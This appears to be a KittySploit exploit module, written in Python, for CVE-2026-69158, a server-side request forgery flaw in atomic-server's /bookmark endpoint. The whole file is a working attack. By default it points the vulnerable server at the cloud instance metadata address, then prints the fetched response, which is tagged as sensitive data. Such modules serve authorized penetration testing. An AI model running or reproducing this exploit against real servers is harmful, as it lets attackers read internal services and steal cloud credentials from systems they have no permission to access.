#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-69158 — atomic-server /bookmark SSRF."""

from kittysploit import *
from lib.protocols.http.atomic_server import Atomic_server
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client, Atomic_server):
    __info__ = {
        "name": "atomic-server CVE-2026-69158 SSRF",
        "description": "Fetches arbitrary URL through GET /bookmark?url=.",
        "author": ["LLCForge", "KittySploit Team"],
        "cve": ["CVE-2026-69158"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-69158"],
        "tags": ["atomic-server", "ssrf", "auxiliary", "cve-2026-69158"],
        "agent": {"approval_required": True, "produces": ["ssrf", "sensitive_data"]},
    }

    ssrf_url = OptString(
        "http://169.254.169.254/latest/meta-data/",
        "URL to fetch via /bookmark",
        required=True,
    )
    output_limit = OptInteger(4096, "Response print limit", required=False, advanced=True)

    def run(self):
        target = str(self.ssrf_url or "").strip()
        code, body = self.as_bookmark_fetch(target)
        if code != 200:
            print_error(f"Bookmark HTTP {code}")
            return False
        lim = int(self.output_limit or 4096)
        print_success(f"SSRF fetched {len(body)} bytes")
        print_status(body if lim <= 0 else body[:lim])
        self.set_info(severity="critical", cve="CVE-2026-69158", target=target)
        return True